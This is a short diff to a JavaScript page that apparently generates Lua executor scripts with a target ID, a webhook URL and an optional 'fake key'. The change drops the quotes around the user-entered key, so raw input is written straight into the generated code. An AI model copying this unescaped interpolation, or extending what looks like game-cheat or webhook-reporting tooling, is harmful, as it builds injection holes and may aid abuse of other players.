@@ -2393,7 +2393,7 @@ end)`;
 
   const useFakeKey = document.getElementById("toggleFakeKey").checked;
   const fakeKeyVal = (document.getElementById("fakeKeyInput").value || "").trim();
-  const fakeKeyLine = (useFakeKey && fakeKeyVal) ? `script_key = "${fakeKeyVal}"\n\n` : "";
+  const fakeKeyLine = (useFakeKey && fakeKeyVal) ? `script_key = ${fakeKeyVal}\n` : "";
 
   let script = `getgenv().targetId = ${targetId}
 getgenv().webhookUrl = "${webhookUrl}"
